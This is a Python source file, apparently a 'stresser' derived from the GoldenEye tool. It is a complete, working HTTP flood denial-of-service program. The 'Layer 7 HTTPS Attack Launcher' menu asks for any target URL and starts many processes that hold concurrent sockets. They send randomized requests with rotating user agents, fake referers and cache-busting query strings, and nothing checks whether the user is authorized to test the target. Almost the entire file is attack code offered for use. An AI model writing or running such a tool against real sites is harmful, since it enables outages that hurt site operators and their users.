#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import datetime
import sys
import getopt
import urllib.parse
import random
import time
from multiprocessing import Process, Manager
import http.client as HTTPCLIENT
from colorama import init, Fore, Style

# Inicializa colorama para colorir o terminal
init(autoreset=True)

# Configurações padrão
DEBUG = False
DEFAULT_WORKERS = 50
DEFAULT_SOCKETS = 30
JOIN_TIMEOUT = 1.0

# Métodos HTTP aceitos
METHOD_GET = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'

def print_logo():
    logo = f"""
{Fore.YELLOW}  ██████  ██▓     ▒█████   ███▄ ▄███▓ ██████ 
 ▒██    ▒ ▓██▒    ▒██▒  ██▒▓██▒▀█▀ ██▒▒██    ▒ 
░ ▓██▄   ▒██░    ▒██░  ██▒▓██    ▓██░░ ▓██▄   
  ▒   ██▒▒██░    ▒██   ██░▒██    ▒██   ▒   ██▒
▒██████▒▒░██████▒░ ████▓▒░▒██▒   ░██▒▒██████▒▒
▒ ▒▓▒ ▒ ░░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░   ░  ░▒ ▒▓▒ ▒ ░
░ ░▒  ░ ░░ ░ ▒  ░  ░ ▒ ▒░ ░  ░      ░░ ░▒  ░ ░
░  ░  ░    ░ ░   ░ ░ ░ ▒  ░      ░   ░  ░  ░  
      ░      ░  ░    ░ ░         ░       ░      
{Style.RESET_ALL}"""
    print(logo)

def clear_screen():
    # Limpa a tela, Windows ou Unix
    import os
    os.system('cls' if os.name == 'nt' else 'clear')

def show_menu():
    clear_screen()
    print_logo()
    print(f"{Fore.CYAN}  ******************************************")
    print(f"  *            Python Stresser             *")
    print(f"  *    Made by https://github.com/uj2w     *")
    print(f"  *      Advanced Network Stress Tool      *")
    print(f"  ******************************************{Style.RESET_ALL}\n")

    print(f"Welcome {Fore.GREEN}{Style.RESET_ALL}")
    now = datetime.datetime.now()
    print(f"Current Date & Time: {now.strftime('%Y-%m-%d %H:%M:%S')}\n")

    print(f"{Fore.MAGENTA}Categories:{Style.RESET_ALL}")
    print("  1. Game Methods")
    print("  2. Layer 4 UDP")
    print("  3. Layer 4 TCP")
    print("  4. Layer 7 HTTPS")
    print("  5. CheckHost")
    print("  6. Tools")
    print("  7. Credits\n")

    choice = input(f"Select category (1-7): ")
    while choice not in [str(i) for i in range(1, 8)]:
        print(Fore.RED + "Invalid selection, try again." + Style.RESET_ALL)
        choice = input(f"Select category (1-7): ")
    return int(choice)

def show_credits():
    clear_screen()
    print_logo()
    print(f"{Fore.YELLOW}GoldenEye - Python Network Stress Tool")
    print("Developed by uj2w")
    print("Inspired by classic stress tools")
    input("Press Enter to return to menu...")

def dummy_category(name):
    clear_screen()
    print_logo()
    print(f"Category: {Fore.CYAN}{name}{Style.RESET_ALL}\n")
    print("This module is under construction.")
    print("Coming soon...\n")
    input("Press Enter to return to menu...")

class GoldenEye:
    """
    Classe principal que gerencia o ataque.
    """
    def __init__(self, url, workers=DEFAULT_WORKERS, sockets=DEFAULT_SOCKETS, method=METHOD_GET):
        self.url = url
        self.nr_workers = workers
        self.nr_sockets = sockets
        self.method = method
        self.manager = Manager()
        self.counter = self.manager.list([0, 0])  # [sucessos, falhas]
        self.workersQueue = []
        self.last_counter = [0,0]

    def fire(self):
        print(f"{Fore.GREEN}Starting attack on {self.url} with {self.nr_workers} workers and {self.nr_sockets} sockets each, method: {self.method}{Style.RESET_ALL}")
        for i in range(self.nr_workers):
            try:
                worker = Laser(self.url, self.nr_sockets, self.counter)
                worker.method = self.method
                self.workersQueue.append(worker)
                worker.start()
            except Exception as e:
                print(f"{Fore.RED}Failed to start worker {i}: {e}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Attack started. Press Ctrl+C to stop.{Style.RESET_ALL}")
        self.monitor()

    def monitor(self):
        try:
            while len(self.workersQueue) > 0:
                for worker in self.workersQueue:
                    if worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workersQueue.remove(worker)
                self.print_stats()
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Attack stopped by user!{Style.RESET_ALL}")
            for worker in self.workersQueue:
                worker.stop()
            sys.exit(0)

    def print_stats(self):
        sent = self.counter[0]
        failed = self.counter[1]
        print(f"\r{Fore.GREEN}Sent: {sent}  {Fore.RED}Failed: {failed}{Style.RESET_ALL}", end='')

class Laser(Process):
    """
    Processo que realiza as conexões HTTP concorrentes.
    """
    def __init__(self, url, nr_sockets, counter):
        super().__init__()
        self.url = url
        self.nr_socks = nr_sockets
        self.counter = counter
        self.runnable = True
        self.method = METHOD_GET

        parsed = urllib.parse.urlparse(url)
        self.ssl = parsed.scheme == 'https'
        self.host = parsed.hostname
        self.port = parsed.port or (443 if self.ssl else 80)
        self.path = parsed.path or '/'
        self.referers = [
            'http://www.google.com/?q=',
            'http://www.usatoday.com/search/results?q=',
            'http://engadget.search.aol.com/search?q=',
            'http://' + self.host + '/'
        ]
        self.useragents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
        ]

    def buildblock(self, size):
        validChars = list(range(97, 123)) + list(range(65, 91)) + list(range(48, 58))
        return ''.join(chr(random.choice(validChars)) for _ in range(size))

    def run(self):
        while self.runnable:
            try:
                conns = []
                for _ in range(self.nr_socks):
                    if self.ssl:
                        conn = HTTPCLIENT.HTTPSConnection(self.host, self.port, timeout=5)
                    else:
                        conn = HTTPCLIENT.HTTPConnection(self.host, self.port, timeout=5)
                    conns.append(conn)

                for conn in conns:
                    url, headers = self.createPayload()
                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
                    conn.request(method.upper(), url, headers=headers)

                for conn in conns:
                    resp = conn.getresponse()
                    # Podemos ler a resposta ou apenas descartar
                    resp.read()
                    self.inc_counter()

                for conn in conns:
                    conn.close()
            except Exception as e:
                self.inc_failed()
                if DEBUG:
                    print(f"Exception in worker: {e}")

    def createPayload(self):
        # Cria URL com query string aleatória e headers
        param_joiner = "&" if "?" in self.path else "?"
        request_url = self.path + param_joiner + self.generateQueryString(random.randint(1, 3))
        headers = self.generateHeaders()
        return request_url, headers

    def generateQueryString(self, count=1):
        return '&'.join(f"{self.buildblock(random.randint(3,8))}={self.buildblock(random.randint(3,8))}" for _ in range(count))

    def generateHeaders(self):
        headers = {
            'User-Agent': random.choice(self.useragents),
            'Cache-Control': 'no-cache',
            'Accept-Encoding': random.choice(['gzip', 'deflate', 'identity']),
            'Connection': 'keep-alive',
            'Host': self.host,
        }
        if random.choice([True, False]):
            headers['Referer'] = random.choice(self.referers) + self.buildblock(random.randint(5, 10))
        if random.choice([True, False]):
            headers['Cookie'] = self.generateQueryString(random.randint(1,2))
        return headers

    def inc_counter(self):
        try:
            self.counter[0] += 1
        except:
            pass

    def inc_failed(self):
        try:
            self.counter[1] += 1
        except:
            pass

    def stop(self):
        self.runnable = False
        self.terminate()

def usage():
    print(f"\nUsage: {sys.argv[0]} <url> [options]\n")
    print("Options:")
    print(f"  -w, --workers   Number of workers (default: {DEFAULT_WORKERS})")
    print(f"  -s, --sockets   Number of sockets per worker (default: {DEFAULT_SOCKETS})")
    print(f"  -m, --method    HTTP method (get, post, random; default: get)")
    print("  -d, --debug     Enable debug mode")
    print("  -h, --help      Show this help message\n")

def parse_args():
    global DEBUG
    if len(sys.argv) < 2:
        usage()
        sys.exit(1)

    url = sys.argv[1]
    if url in ("-h", "--help"):
        usage()
        sys.exit(0)

    if not url.lower().startswith("http"):
        print(f"{Fore.RED}Invalid URL: must start with http or https.{Style.RESET_ALL}")
        sys.exit(1)

    workers = DEFAULT_WORKERS
    sockets = DEFAULT_SOCKETS
    method = METHOD_GET

    try:
        opts, _ = getopt.getopt(sys.argv[2:], "dw:s:m:h", ["debug", "workers=", "sockets=", "method=", "help"])
    except getopt.GetoptError as e:
        print(f"{Fore.RED}{e}{Style.RESET_ALL}")
        usage()
        sys.exit(1)

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            usage()
            sys.exit(0)
        elif opt in ("-d", "--debug"):
            DEBUG = True
        elif opt in ("-w", "--workers"):
            workers = int(arg)
        elif opt in ("-s", "--sockets"):
            sockets = int(arg)
        elif opt in ("-m", "--method"):
            if arg.lower() in (METHOD_GET, METHOD_POST, METHOD_RAND):
                method = arg.lower()
            else:
                print(f"{Fore.RED}Invalid method: {arg}{Style.RESET_ALL}")
                usage()
                sys.exit(1)

    return url, workers, sockets, method

def main():
    # Menu principal com categorias (dummy)
    while True:
        choice = show_menu()
        if choice == 7:
            show_credits()
        elif choice == 1:
            dummy_category("Game Methods")
        elif choice == 2:
            dummy_category("Layer 4 UDP")
        elif choice == 3:
            dummy_category("Layer 4 TCP")
        elif choice == 4:
            # Para o exemplo vamos pedir o alvo e iniciar o ataque
            clear_screen()
            print_logo()
            print(f"{Fore.CYAN}Layer 7 HTTPS Attack Launcher{Style.RESET_ALL}\n")
            target = input("Enter target URL (with http/https): ").strip()
            if not target.lower().startswith("http"):
                print(f"{Fore.RED}Invalid URL. Returning to main menu...{Style.RESET_ALL}")
                time.sleep(2)
                continue

            try:
                workers = int(input(f"Workers (default {DEFAULT_WORKERS}): ") or DEFAULT_WORKERS)
                sockets = int(input(f"Sockets per worker (default {DEFAULT_SOCKETS}): ") or DEFAULT_SOCKETS)
                method = input(f"HTTP Method (get/post/random) [default get]: ").lower() or METHOD_GET
                if method not in (METHOD_GET, METHOD_POST, METHOD_RAND):
                    method = METHOD_GET
            except Exception:
                print(f"{Fore.RED}Invalid input. Using default values.{Style.RESET_ALL}")
                workers, sockets, method = DEFAULT_WORKERS, DEFAULT_SOCKETS, METHOD_GET

            goldeneye = GoldenEye(target, workers, sockets, method)
            goldeneye.fire()
            input("\nPress Enter to return to main menu...")
        else:
            dummy_category(f"Option {choice}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Program interrupted. Exiting...{Style.RESET_ALL}")
        sys.exit(0)
